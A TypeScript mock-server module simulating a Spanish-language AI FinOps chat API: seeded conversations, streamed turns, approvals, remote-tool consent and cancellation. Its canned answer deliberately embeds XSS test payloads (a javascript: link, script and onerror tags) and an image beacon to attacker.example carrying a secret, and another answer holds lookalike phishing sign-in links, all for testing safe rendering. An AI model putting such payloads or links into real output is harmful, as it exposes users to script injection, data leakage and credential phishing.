/**
 * Chat of the mock: conversations in memory and the turns of `POST /api/chat/turns`, read in
 * `v1` (D120, D121), with the turn in flight of a conversation (R3b).
 */
import { randomBytes } from 'node:crypto';
import type { IncomingMessage, ServerResponse } from 'node:http';

import { agents, versionOf } from './agents.ts';
import { approvalsOfConversation, requestFromChat, requestToolFromChat } from './approvals.ts';
import { recordAudit } from './audit.ts';
import { turnAttachments, type StoredAttachment } from './chatFiles.ts';
import { bearerOf, firstUsableRemote, isConnected, markConsentPending } from './connections.ts';
import { newId, readBody, sendError, sendJson, type ApiHandler } from './http.ts';
import { codeVariant, demoAnswer, demoCells, type DemoCell } from './codeDemo.ts';
import { demoTicket } from './tickets.ts';
import {
  CANCELLED,
  Compressor,
  Translator,
  completeFrames,
  deltaFrame,
  encodingFrame,
  textOf,
  type TurnEnd,
  type TurnEventRecord,
} from './turnTranslator.ts';

interface StoredMessage {
  message_id: string;
  role: 'user' | 'assistant';
  content: string;
  created_at: string;
  tools: { name: string; status: string }[];
  /** Ids of the approval requests the answer's write tool calls created (D27). */
  approvals?: string[];
  /** Sources of the answer: knowledge base, document and page, never text (D88 (44)). */
  citations?: { knowledge_base: string; document: string; page?: number }[];
  /** Remote registrations that asked to connect, and the ones that answered (D98 (20)). */
  connection_required?: string[];
  remote_sources?: string[];
  /** Why a stored answer was cut (R3b): «Detener», or Mango lost the turn. */
  stopped?: boolean;
  stop_code?: 'cancelled' | 'turn_interrupted';
  /** The files of a question (D116 (11)); `gone` after 90 days. */
  attachments?: StoredAttachment[];
  /** The cells of the code sandbox the answer showed (C4), as the API returns them. */
  code?: DemoCell[];
}

interface StoredConversation {
  conversation_id: string;
  /** Fixed by the first turn (`POST /chat/turns` with `agent_id`). */
  agent_id: string;
  title: string;
  updated_at: string;
  messages: StoredMessage[];
}

const conversations = new Map<string, StoredConversation>();
/** A conversation id as the API makes it (32 hex, `secrets.token_hex(16)`): its routes check it. */
const newConversationId = (): string => randomBytes(16).toString('hex');
/** Agent of a chat that names none, and of the seeded conversations. */
const RELEASE_AGENT = 'finops';
const AGENT_ID = /^(?:[a-z2-7]{16}|[a-z][a-z0-9]{1,15})$/;

const CANNED_ANSWER = `Este es el resumen del **gasto de septiembre de 2026** (del 1 al 28, todas las cuentas de la organización):

| Servicio | Costo (USD) | Variación vs. agosto |
|---|---:|---:|
| Amazon EC2 | 12.430,55 | +8,2 % |
| Amazon RDS | 4.210,10 | -1,4 % |
| Amazon S3 | 1.874,32 | +0,6 % |
| **Total** | **18.514,97** | **+5,1 %** |

**Principal driver:** EC2 en la cuenta \`prod-payments\` (instancias \`m7i.2xlarge\` nuevas desde el día 12).

Recomendaciones:
1. Revisar el rightsizing de las instancias \`m7i.2xlarge\` (ahorro estimado: USD 1.100/mes).
2. Evaluar un Compute Savings Plan de 1 año.

---
*Pruebas de renderizado seguro (contenido no confiable del modelo):*

- Enlace externo con confirmación: [documentación de Cost Explorer](https://docs.aws.amazon.com/cost-management/latest/userguide/ce-what-is.html)
- Enlace \`javascript:\` neutralizado: [haz clic](javascript:alert(document.domain))
- Imagen remota bloqueada: ![pixel](https://attacker.example/p.png?d=secret)
- HTML crudo descartado: <script>alert(1)</script><img src=x onerror=alert(1)><b>negrita html</b>
`;

/** What a remote MCP returned, with links of the company, of another organization and of
 * another domain (design remote-core.jsx `RM_READ`). Placeholder content, never real. */
const REMOTE_ANSWER = `Encontré 3 work items abiertos del sprint 42 en **Plataforma**:

| ID | Título | Estado |
|---|---|---|
| 1287 | Migrar el pipeline de despliegue | Activo |
| 1291 | Rotar certificados de staging | Nuevo |
| 1302 | Revisar alertas de costo | Activo |

La página del sprint está en la [wiki de Plataforma](https://dev.azure.com/empresa/Plataforma/_wiki/wikis/Plataforma.wiki/12). La misma página dice que el tablero completo está en [el tablero](https://dev.azure.com/plataforma-tableros/_signin) y que, si no carga, entres por [este enlace](https://azure-devops-signin.example.net/login).`;

function chunkText(text: string, size: number): string[] {
  const chunks: string[] = [];
  for (let i = 0; i < text.length; i += size) chunks.push(text.slice(i, i + size));
  return chunks;
}

const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

/**
 * Dev-only history spread over several days, so the grouped conversation list (hoy, ayer, esta
 * semana, anteriores) can be reviewed without waiting days. Titles include HTML to check they
 * render as text.
 */
function seedConversations(): void {
  const HOUR_MS = 3_600_000;
  const savingsPlans = [...agents.values()].find(
    (agent) =>
      agent.status === 'published' &&
      versionOf(agent, agent.published_version)?.definition.name === 'Savings Plans',
  );
  // Design round 40: a file of the history that is no longer there («Ya no disponible»).
  const gone: StoredAttachment = {
    file_id: newId(),
    name: 'cobertura_julio_2026.csv',
    kind: 'csv',
    size_bytes: 482_133,
    gone: true,
  };
  const seeds: [title: string, hoursAgo: number, agentId: string, files?: StoredAttachment[]][] = [
    ['Gasto de EC2 del mes', 1, RELEASE_AGENT],
    ['Pronóstico de fin de mes', 26, RELEASE_AGENT],
    ['Anomalías <b>de la semana</b>', 4 * 24, RELEASE_AGENT],
    ['Savings Plans de agosto', 20 * 24, savingsPlans?.agent_id ?? RELEASE_AGENT, [gone]],
  ];
  for (const [title, hoursAgo, agentId, files] of seeds) {
    const updatedAt = new Date(Date.now() - hoursAgo * HOUR_MS).toISOString();
    const conversationId = newConversationId();
    conversations.set(conversationId, {
      conversation_id: conversationId,
      agent_id: agentId,
      title,
      updated_at: updatedAt,
      messages: [
        {
          message_id: newId(),
          role: 'user',
          content: `${title}?`,
          created_at: updatedAt,
          tools: [],
          ...(files ? { attachments: files } : {}),
        },
        {
          message_id: newId(),
          role: 'assistant',
          content: CANNED_ANSWER,
          created_at: updatedAt,
          tools: [
            { name: 'get_cost_and_usage', status: 'started' },
            { name: 'get_cost_and_usage', status: 'completed' },
            { name: 'get_cost_forecast', status: 'started' },
            { name: 'get_cost_forecast', status: 'completed' },
          ],
        },
      ],
    });
  }
}
seedConversations();

/** A turn admitted like the API admits it: what the scenario needs to answer it. */
interface AdmittedTurn {
  conversation: StoredConversation;
  chatAgent: string;
  version: { number: number; definition: { name: string } };
  message: string;
  turn: { agent: string; version: number; model: string; conversation_id: string; turn: string };
  /** The bearer of the request, for the remote MCP consent of the mock. */
  bearer: string | null;
}

/** Where a turn writes its events (D57): its record (D121). */
interface TurnSink {
  send: (event: string, data: unknown) => void;
  closed: () => boolean;
  /** The turn never started (the worker's rejection): its stream ends with this error. */
  reject: (error: { status: number; code: string; message: string }) => void;
}

/** Validates and admits a chat turn (the checks of `begin_turn`); answers the error itself. */
async function admitTurn(req: IncomingMessage, res: ServerResponse): Promise<AdmittedTurn | null> {
  let body: unknown;
  try {
    body = JSON.parse(await readBody(req));
  } catch {
    sendError(res, 422, 'invalid_request', 'Invalid JSON body');
    return null;
  }
  const record: Record<string, unknown> =
    typeof body === 'object' && body !== null ? (body as Record<string, unknown>) : {};
  const allowedKeys = ['agent_id', 'conversation_id', 'message', 'model', 'attachments'];
  const {
    conversation_id: conversationId,
    message,
    agent_id: agentId,
    model,
    attachments,
  } = record;
  if (
    Object.keys(record).some((key) => !allowedKeys.includes(key)) ||
    typeof message !== 'string' ||
    message.length < 1 ||
    message.length > 4000 ||
    (conversationId != null && typeof conversationId !== 'string') ||
    (agentId != null && (typeof agentId !== 'string' || !AGENT_ID.test(agentId))) ||
    (model != null && typeof model !== 'string') ||
    (attachments != null && (!Array.isArray(attachments) || attachments.length > 20))
  ) {
    sendError(res, 422, 'invalid_request', 'Invalid chat request');
    return null;
  }
  if (/presupuesto agotado/i.test(message)) {
    sendError(res, 402, 'budget_exceeded', 'Budget exceeded');
    return null;
  }

  let conversation =
    typeof conversationId === 'string' ? conversations.get(conversationId) : undefined;
  const files = Array.isArray(attachments) ? (attachments as unknown[]) : [];
  // D116 (11): a new chat whose files were uploaded first names the conversation they went to.
  const startsWithFiles =
    typeof conversationId === 'string' &&
    !conversation &&
    /^[0-9a-f]{32}$/.test(conversationId) &&
    files.length > 0;
  if (typeof conversationId === 'string' && !conversation && !startsWithFiles) {
    sendError(res, 404, 'not_found', 'Conversation not found');
    return null;
  }
  let attached: StoredAttachment[] = [];
  if (files.length > 0) {
    if (typeof conversationId !== 'string') {
      sendError(res, 422, 'attachments_need_conversation', 'name the conversation');
      return null;
    }
    const checked = turnAttachments(conversationId, files);
    if (!Array.isArray(checked)) {
      sendError(res, checked.status, checked.code, 'an attachment is not usable');
      return null;
    }
    attached = checked;
  }
  // A conversation keeps the agent of its first turn; the agent must be published and the
  // model one of the version's allowed models (same answers as the API).
  const chatAgent =
    conversation?.agent_id ?? (typeof agentId === 'string' ? agentId : RELEASE_AGENT);
  if (typeof agentId === 'string' && agentId !== chatAgent) {
    sendError(res, 409, 'agent_mismatch', 'This conversation belongs to another agent');
    return null;
  }
  const agent = agents.get(chatAgent);
  const version = agent ? versionOf(agent, agent.published_version) : null;
  if (!agent || !version || agent.status === 'draft') {
    sendError(res, 403, 'forbidden', 'not allowed');
    return null;
  }
  if (agent.status === 'retired') {
    sendError(res, 409, 'agent_retired', 'This agent was retired');
    return null;
  }
  const chatModel = typeof model === 'string' ? model : (version.definition.model ?? '');
  if (!version.definition.allowed_models.includes(chatModel)) {
    sendError(res, 422, 'model_not_allowed', 'The agent does not allow this model');
    return null;
  }
  if (!conversation) {
    conversation = {
      conversation_id: startsWithFiles ? conversationId : newConversationId(),
      agent_id: chatAgent,
      title: message.slice(0, 60),
      updated_at: '',
      messages: [],
    };
    conversations.set(conversation.conversation_id, conversation);
  }
  const now = new Date().toISOString();
  conversation.updated_at = now;
  conversation.messages.push({
    message_id: newId(),
    role: 'user',
    content: message,
    created_at: now,
    tools: [],
    ...(attached.length > 0 ? { attachments: attached } : {}),
  });
  // Same events as the API: the turn's `UseAgent` decision, `agent.invoke`, then
  // `agent.completed` with the settled cost and the turn's authorization.
  const turn = {
    agent: chatAgent,
    version: version.number,
    model: chatModel,
    conversation_id: conversation.conversation_id,
    turn: newId(),
  };
  recordAudit('policy.decision', {
    action: 'UseAgent',
    resource: `Mango::Agent::${chatAgent}`,
    allowed: true,
    read_only: false,
    conversation_id: turn.conversation_id,
    turn: turn.turn,
  });
  recordAudit('agent.invoke', turn);
  return {
    conversation,
    chatAgent,
    version,
    message,
    turn,
    bearer: bearerOf(req),
  };
}

/** The answer of the mock agent, event by event, with the demo variants of the design. */
async function runTurn(admitted: AdmittedTurn, sink: TurnSink): Promise<void> {
  const { conversation, chatAgent, version, message, turn } = admitted;
  const { send } = sink;
  // What the turn stores at its end; nothing once it was stopped (the stop keeps what it saw).
  const keep = (stored: StoredMessage) => {
    if (!sink.closed()) conversation.messages.push(stored);
  };

  send('conversation', { conversation_id: conversation.conversation_id });
  // Live progress like the API: `status` on every phase change, never text of the model.
  send('status', { phase: 'thinking' });
  await sleep(300);
  // Design round 40 «Turno en otra pestaña»: the API refuses the turn (`conversation_busy`) and
  // its question never reaches the conversation.
  if (/otra pestaña/i.test(message)) {
    conversation.messages.pop();
    // The turn of the other tab, live: this tab reads it after the refusal (R3b).
    startTurn({ ...admitted, message: OTHER_TAB_QUESTION, turn: { ...turn, turn: newId() } });
    conversation.messages.push({
      message_id: newId(),
      role: 'user',
      content: OTHER_TAB_QUESTION,
      created_at: new Date().toISOString(),
      tools: [],
    });
    sink.reject({
      status: 409,
      code: 'conversation_busy',
      message: 'another message is being answered; try again',
    });
    return;
  }
  if (/error/i.test(message)) {
    send('error', { code: 'upstream_error', message: 'Simulated upstream failure' });
    return;
  }
  // Design round 40 «Ejecuta código»: the agent runs two cells in the sandbox (C4); the words of
  // the message pick the variant of the block, the figure and the files (see codeDemo.ts).
  const variant = codeVariant(message);
  if (variant) {
    const cells = demoCells(conversation.conversation_id, variant, message);
    for (const cell of cells) {
      send('tool', { name: 'run_python', status: 'started', code: true });
      send('status', { phase: 'code' });
      await sleep(cell.status === 'timeout' ? 2400 : 1100);
      if (sink.closed()) return;
      send('tool', {
        name: 'run_python',
        status: cell.status === 'completed' || cell.blocked ? 'completed' : 'error',
        code: true,
      });
      send('code', cell);
    }
    send('status', { phase: 'writing' });
    const reply = demoAnswer(variant, message);
    send('delta', { text: reply });
    const replyId = newId();
    keep({
      message_id: replyId,
      role: 'assistant',
      content: reply,
      created_at: new Date().toISOString(),
      tools: cells.flatMap((cell) => [
        { name: 'run_python', status: 'started' },
        { name: 'run_python', status: cell.status === 'completed' ? 'completed' : 'error' },
      ]),
      code: cells,
    });
    send('done', {
      message_id: replyId,
      stop_reason: 'end_turn',
      usage: { input_tokens: 1240, output_tokens: 310 },
      cost_usd: '0.0084',
    });
    return;
  }
  // "abre un ticket", "comenta en el ticket", "actualiza el ticket": the agent calls the tickets
  // tool (D112 (8)); its manifest declares the `self` default, so the person confirms each call.
  if (/\bticket\b/i.test(message)) {
    const target = demoTicket();
    const kind = /coment/i.test(message)
      ? 'comment_ticket'
      : /actualiza|cambia|cierra|resuelve|mueve|asigna/i.test(message) && target
        ? 'update_ticket'
        : 'create_ticket';
    const args: Record<string, unknown> =
      kind === 'comment_ticket' && target
        ? {
            ticket_id: target.ticket_id,
            body: 'Revisé el **desglose**: el aumento viene de prod-web.',
          }
        : kind === 'update_ticket' && target
          ? { ticket_id: target.ticket_id, status: 'in_progress' }
          : { title: 'Revisar el aumento de costo de <b>prod-web</b>', priority: 'medium' };
    send('tool', { name: kind, status: 'started' });
    await sleep(400);
    send('tool', { name: kind, status: 'error' });
    const request = requestToolFromChat(
      conversation.conversation_id,
      {
        tool: `mango-tickets.${kind}`,
        server_name: 'Tickets de Mango',
        description:
          kind === 'create_ticket'
            ? 'Crear un ticket de Mango a nombre de quien conversa, ligado a este agente y a esta conversación.'
            : kind === 'update_ticket'
              ? 'Cambiar el estado o la prioridad de un ticket, o asignárselo a quien conversa.'
              : 'Comentar un ticket a nombre de quien conversa.',
        agent_id: chatAgent,
        agent_name: version.definition.name,
      },
      args,
    );
    send('approval', request);
    const reply = 'Para escribir en un ticket necesito **tu confirmación**.';
    send('delta', { text: reply });
    const replyId = newId();
    keep({
      message_id: replyId,
      role: 'assistant',
      content: reply,
      created_at: new Date().toISOString(),
      tools: [
        { name: kind, status: 'started' },
        { name: kind, status: 'error' },
      ],
      approvals: [request.approval_id],
    });
    send('done', {
      message_id: replyId,
      stop_reason: 'end_turn',
      usage: { input_tokens: 380, output_tokens: 40 },
      cost_usd: '0.0024',
    });
    return;
  }
  // "crea un presupuesto de 300 para team-a": the agent calls the write tool, the Gateway
  // refuses it and the API asks a person to confirm (D27).
  const budget = /presupuesto de (\d{1,9})(?: para ([a-z0-9-]{1,40}))?/i.exec(message);
  if (budget) {
    send('tool', { name: 'create_budget', status: 'started' });
    await sleep(600);
    send('tool', { name: 'create_budget', status: 'error' });
    const request = requestFromChat(
      conversation.conversation_id,
      budget[2] ?? 'nuevo',
      Number(budget[1]),
    );
    send('approval', request);
    const reply =
      request.tier === 'self'
        ? 'Esta acción modifica recursos. Según la política, basta con **tu confirmación** antes de ejecutarla.'
        : 'Puedo hacerlo, pero la política exige **aprobación de otras personas**. La dejé en cola; cuando la aprueben podrás ejecutarla desde aquí.';
    send('delta', { text: reply });
    const replyId = newId();
    keep({
      message_id: replyId,
      role: 'assistant',
      content: reply,
      created_at: new Date().toISOString(),
      tools: [
        { name: 'create_budget', status: 'started' },
        { name: 'create_budget', status: 'error' },
      ],
      approvals: [request.approval_id],
    });
    send('done', {
      message_id: replyId,
      stop_reason: 'end_turn',
      usage: { input_tokens: 420, output_tokens: 60 },
      cost_usd: '0.0031',
    });
    return;
  }
  // "sprint": the agent reads Azure DevOps through a remote MCP (D93). Without a connection the
  // tool answers `consent_required` and the stream says which registration, never a URL.
  const remote = /sprint/i.test(message) ? firstUsableRemote() : null;
  if (remote) {
    const tool = 'wit_work_item';
    send('tool', { name: tool, status: 'started' });
    send('status', { phase: 'tool', tool });
    await sleep(400);
    const ready = isConnected(remote.id);
    send('tool', { name: tool, status: ready ? 'completed' : 'error' });
    if (!ready) {
      markConsentPending(remote.id, admitted.bearer);
      send('remote_connection_required', { registration_id: remote.id });
    }
    send('status', { phase: 'writing' });
    // "enlace": the agent also writes a link to «authorize» (design round 25 `RM_ASK_LINK`): it
    // never gets the real URL, so the web takes the link out.
    const ask = 'Necesito que conectes tu cuenta de Azure DevOps para leer el sprint.';
    const reply = ready
      ? REMOTE_ANSWER
      : /enlace/i.test(message)
        ? `${ask} Autoriza el acceso aquí: [Autorizar Azure DevOps](https://azdevops-authorize.example.com/oauth/consent).`
        : ask;
    send('delta', { text: reply });
    const replyId = newId();
    keep({
      message_id: replyId,
      role: 'assistant',
      content: reply,
      created_at: new Date().toISOString(),
      tools: [
        { name: tool, status: 'started' },
        { name: tool, status: ready ? 'completed' : 'error' },
      ],
      ...(ready ? { remote_sources: [remote.id] } : { connection_required: [remote.id] }),
    });
    send('done', {
      message_id: replyId,
      stop_reason: 'end_turn',
      usage: { input_tokens: 610, output_tokens: 140 },
      cost_usd: '0.0042',
      remote_sources: ready ? [remote.id] : [],
    });
    return;
  }
  // "vacaciones": the agent searches a knowledge base first; the stream says where and how many
  // fragments, and each source with its document and page, never the text (D88 (44)).
  const searchesKnowledge = /vacaciones/i.test(message);
  const citations = searchesKnowledge
    ? [
        { knowledge_base: 'Políticas de RH', document: 'documento-001.pdf', page: 3 },
        { knowledge_base: 'Políticas de RH', document: 'documento-002.pdf' },
      ]
    : [];
  if (searchesKnowledge) {
    send('tool', { name: 'retrieve', status: 'started' });
    send('status', { phase: 'tool', tool: 'retrieve' });
    await sleep(400);
    send('tool', { name: 'retrieve', status: 'completed' });
    send('knowledge', { knowledge_bases: ['Políticas de RH'], count: 3, sources: citations });
    send('status', { phase: 'tool_result' });
  }
  // To review the progress states: "en paralelo" runs two tools at once and one fails;
  // "guardrail" cuts the answer halfway, like the API's `guardrail_intervened`.
  const parallel = /paralelo/i.test(message);
  const cut = /guardrail/i.test(message);
  // "tope" ends the answer at its token cap, like the API's `max_tokens` (design round 34).
  const capped = /\btope\b/i.test(message);
  send('tool', { name: 'get_cost_and_usage', status: 'started' });
  send('status', { phase: 'tool', tool: 'get_cost_and_usage' });
  if (parallel) send('tool', { name: 'get_rightsizing_recommendations', status: 'started' });
  await sleep(1200);
  if (parallel) send('tool', { name: 'get_rightsizing_recommendations', status: 'error' });
  send('tool', { name: 'get_cost_and_usage', status: 'completed' });
  send('status', { phase: 'tool_result' });
  send('tool', { name: 'get_cost_forecast', status: 'started' });
  send('status', { phase: 'tool', tool: 'get_cost_forecast' });
  await sleep(700);
  send('tool', { name: 'get_cost_forecast', status: 'completed' });
  send('status', { phase: 'tool_result' });
  await sleep(500);
  send('status', { phase: 'writing' });

  let answer = '';
  const text =
    cut || capped ? CANNED_ANSWER.slice(0, Math.round(CANNED_ANSWER.length * 0.45)) : CANNED_ANSWER;
  // Design round 40 «Turno interrumpido»: Mango loses the turn after part of the answer.
  const lost = /interrumpid/i.test(message);
  const pieces = chunkText(text, 24);
  for (const [index, piece] of pieces.entries()) {
    if (sink.closed()) break;
    if (lost && index > pieces.length * 0.4) {
      // As the API: what the person saw is kept with why it was cut, then its own code (R3b).
      keep({
        message_id: newId(),
        role: 'assistant',
        content: answer,
        created_at: new Date().toISOString(),
        tools: [],
        stopped: true,
        stop_code: 'turn_interrupted',
      });
      send('error', { code: 'turn_interrupted', message: 'the answer was interrupted' });
      return;
    }
    answer += piece;
    send('delta', { text: piece });
    await sleep(40);
  }
  const messageId = newId();
  keep({
    message_id: messageId,
    role: 'assistant',
    content: answer,
    created_at: new Date().toISOString(),
    tools: [
      { name: 'get_cost_and_usage', status: 'completed' },
      ...(parallel ? [{ name: 'get_rightsizing_recommendations', status: 'error' }] : []),
      { name: 'get_cost_forecast', status: 'completed' },
    ],
    ...(citations.length ? { citations } : {}),
  });
  send('done', {
    message_id: messageId,
    stop_reason: cut ? 'guardrail_intervened' : capped ? 'max_tokens' : 'end_turn',
    usage: { input_tokens: 1234, output_tokens: 321 },
    cost_usd: '0.0123',
  });
  recordAudit('agent.completed', {
    ...turn,
    stop_reason: 'end_turn',
    tools: ['get_cost_and_usage', 'get_cost_forecast'],
    input_tokens: 1234,
    output_tokens: 321,
    cost_usd: '0.0123',
    authz: { action: 'UseAgent', allowed: true },
  });
}

/**
 * Demo variants of the design (round 40) for the connection of a turn, by a word of the
 * question: «reconecta» cuts the first connection halfway and the next one resumes; «no
 * reconecta» cuts it and answers 502 to the next 12 (then «Volver a conectar» works); «sesión
 * termina» cuts it and answers 401 (the session ended while reconnecting).
 */
type ConnectionDemo = 'cut' | 'cut-fail' | 'cut-session' | null;

function connectionDemo(message: string): ConnectionDemo {
  if (/no reconecta/i.test(message)) return 'cut-fail';
  if (/sesi[oó]n termina/i.test(message)) return 'cut-session';
  if (/reconecta/i.test(message)) return 'cut';
  return null;
}

/** A turn of the mock (D121): its events, how it ended, and who reads it. */
interface MockTurn {
  turnId: string;
  conversationId: string;
  events: TurnEventRecord[];
  end: TurnEnd | null;
  readers: Set<() => void>;
  demo: ConnectionDemo;
  /** Connections after the cut, for «no reconecta». */
  afterCut: number;
  cut: boolean;
  /** For «Cancelar»: the conversation, to store what was written. */
  conversation: StoredConversation;
}

const turns = new Map<string, MockTurn>();
/** Deltas the first connection of a «reconecta» turn sends before it is cut. */
const CUT_AFTER = 18;
const FAILED_RECONNECTS = 12;

function notify(turn: MockTurn): void {
  for (const reader of turn.readers) reader();
}

/** The question of the other tab's turn in the demo «Turno en otra pestaña» (design round 40). */
const OTHER_TAB_QUESTION = '¿Qué cuentas explican el aumento de EC2?';

/** `POST /api/chat/turns` (D120, D121 (2)): the turn is admitted, then run apart. */
async function createTurn(req: IncomingMessage, res: ServerResponse): Promise<void> {
  const admitted = await admitTurn(req, res);
  if (!admitted) return;
  const turn = startTurn(admitted);
  sendJson(res, 200, { conversation_id: turn.conversationId, turn_id: turn.turnId });
}

/** Runs an admitted turn into its record, read by `GET …/stream` (the worker of D121). */
function startTurn(admitted: AdmittedTurn): MockTurn {
  const turnId = admitted.turn.turn;
  const turn: MockTurn = {
    turnId,
    conversationId: admitted.conversation.conversation_id,
    events: [],
    end: null,
    readers: new Set(),
    demo: connectionDemo(admitted.message),
    afterCut: 0,
    cut: false,
    conversation: admitted.conversation,
  };
  turns.set(turnId, turn);
  const ended = () =>
    turn.end !== null || turn.events.some((e) => e.kind === 'done' || e.kind === 'error');
  void runTurn(admitted, {
    send: (event, data) => {
      if (ended() || event === 'conversation') return;
      turn.events.push({ kind: event, data: data as Record<string, unknown> });
      notify(turn);
    },
    closed: ended,
    reject: (error) => {
      if (ended()) return;
      turn.end = { state: 'failed', error };
      notify(turn);
    },
  }).then(() => {
    if (!ended()) turn.end = { state: 'done' };
    notify(turn);
  });
  return turn;
}

/** A turn still running: its events end neither in `done` nor `error`. */
const running = (turn: MockTurn) =>
  turn.end === null && !turn.events.some((e) => e.kind === 'done' || e.kind === 'error');

/** `GET /api/chat/turns/{turn}/stream?after=<n>`: the turn in `v1`, from delta `after + 1`. */
function streamTurn(req: IncomingMessage, res: ServerResponse, turnId: string): void {
  const turn = turns.get(turnId);
  const after = Number(new URL(req.url ?? '', 'http://mock').searchParams.get('after') ?? '0');
  if (!turn || !Number.isInteger(after) || after < 0) {
    sendError(res, 404, 'not_found', 'not found');
    return;
  }
  if (turn.cut && turn.demo === 'cut-session') {
    sendError(res, 401, 'unauthenticated', 'invalid token');
    return;
  }
  if (turn.cut && turn.demo === 'cut-fail' && turn.afterCut < FAILED_RECONNECTS) {
    turn.afterCut += 1;
    sendError(res, 502, 'http_502', 'Bad Gateway');
    return;
  }
  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-store');
  const translator = new Translator(turn.turnId, turn.conversationId);
  const compressor = new Compressor();
  let offset = 0;
  let seen = 0;
  let sentHere = 0;
  let closed = false;
  res.write(encodingFrame());
  const ping = setInterval(() => {
    res.write(': ping\n\n');
  }, 15_000);
  const stop = () => {
    closed = true;
    clearInterval(ping);
    turn.readers.delete(pump);
  };
  const pump = () => {
    if (closed) return;
    const deltas = turn.events.slice(seen).flatMap((event) => translator.feed(event));
    seen = turn.events.length;
    if (turn.end && !translator.ended) deltas.push(...translator.close(turn.end));
    for (const delta of deltas) {
      offset += 1;
      if (offset <= after) continue;
      // The demo cut: the first connection drops halfway through the answer.
      if (turn.demo !== null && !turn.cut && sentHere >= CUT_AFTER) {
        turn.cut = true;
        stop();
        res.destroy();
        return;
      }
      res.write(deltaFrame(offset, compressor.short(delta)));
      sentHere += 1;
    }
    if (translator.ended) {
      res.write(completeFrames(turn.conversationId, turn.turnId));
      stop();
      res.end();
    }
  };
  req.on('close', stop);
  turn.readers.add(pump);
  pump();
}

/** `POST /api/chat/turns/{turn}/cancel` (D121 (7)): interrupted, what was written is kept. */
function cancelTurn(res: ServerResponse, turnId: string): void {
  const turn = turns.get(turnId);
  if (!turn) {
    sendError(res, 404, 'not_found', 'not found');
    return;
  }
  const cancelled = running(turn);
  if (cancelled) {
    turn.events.push({ kind: 'error', data: { ...CANCELLED } });
    const text = turn.events
      .flatMap((e) => (e.kind === 'delta' ? [textOf(e.data.text, '')] : []))
      .join('');
    if (text) {
      turn.conversation.messages.push({
        message_id: newId(),
        role: 'assistant',
        content: text,
        created_at: new Date().toISOString(),
        tools: turn.events.flatMap((e) =>
          e.kind === 'tool'
            ? [{ name: textOf(e.data.name, ''), status: textOf(e.data.status, '') }]
            : [],
        ),
        stopped: true,
        stop_code: 'cancelled',
      });
    }
    notify(turn);
  }
  sendJson(res, 200, {
    turn_id: turnId,
    state: cancelled ? 'interrupted' : turn.end?.state === 'failed' ? 'failed' : 'done',
    cancelled,
  });
}

export const handleChatApi: ApiHandler = async (req, res, path) => {
  if (path === '/conversations' && req.method === 'GET') {
    const items = [...conversations.values()]
      .sort((a, b) => b.updated_at.localeCompare(a.updated_at))
      .map(({ conversation_id, title, updated_at, agent_id }) => ({
        conversation_id,
        title,
        updated_at,
        agent_id,
      }));
    sendJson(res, 200, { items });
    return true;
  }
  const match = /^\/conversations\/([A-Za-z0-9_-]+)$/.exec(path);
  if (match && req.method === 'GET') {
    const conversation = conversations.get(match[1] ?? '');
    if (!conversation) {
      sendError(res, 404, 'not_found', 'Conversation not found');
      return true;
    }
    const { conversation_id, title, agent_id, messages } = conversation;
    sendJson(res, 200, {
      conversation_id,
      title,
      agent_id,
      messages,
      approvals: approvalsOfConversation(conversation_id),
    });
    return true;
  }
  // The turn of a conversation that is still running (R3b): what a reloaded page follows.
  const inFlight = /^\/conversations\/([A-Za-z0-9_-]+)\/turn$/.exec(path);
  if (inFlight && req.method === 'GET') {
    const id = inFlight[1] ?? '';
    if (!conversations.has(id)) {
      sendError(res, 404, 'not_found', 'not found');
      return true;
    }
    const turn = [...turns.values()].find((t) => t.conversationId === id && running(t));
    sendJson(res, 200, { turn: turn ? { turn_id: turn.turnId, state: 'running' } : null });
    return true;
  }
  if (path === '/chat/turns' && req.method === 'POST') {
    await createTurn(req, res);
    return true;
  }
  const turnStream = /^\/chat\/turns\/([A-Za-z0-9_-]{1,64})\/stream$/.exec(path);
  if (turnStream && req.method === 'GET') {
    streamTurn(req, res, turnStream[1] ?? '');
    return true;
  }
  const turnCancel = /^\/chat\/turns\/([A-Za-z0-9_-]{1,64})\/cancel$/.exec(path);
  if (turnCancel && req.method === 'POST') {
    cancelTurn(res, turnCancel[1] ?? '');
    return true;
  }
  return false;
};

/** The tool calls of the mock user's conversations, for the Actividad mock (D90). */
export function toolCallsOfMine() {
  return [...conversations.values()].flatMap((conversation) =>
    conversation.messages.flatMap((message) =>
      message.tools
        .filter((tool) => tool.status === 'started')
        .map((tool) => ({
          conversation_id: conversation.conversation_id,
          agent_id: conversation.agent_id,
          at: message.created_at,
          tool: tool.name,
        })),
    ),
  );
}

/** The mock user's conversations, newest first, for the search mock (D103). */
export function conversationsOfMine(): readonly StoredConversation[] {
  return [...conversations.values()].sort((a, b) => b.updated_at.localeCompare(a.updated_at));
}
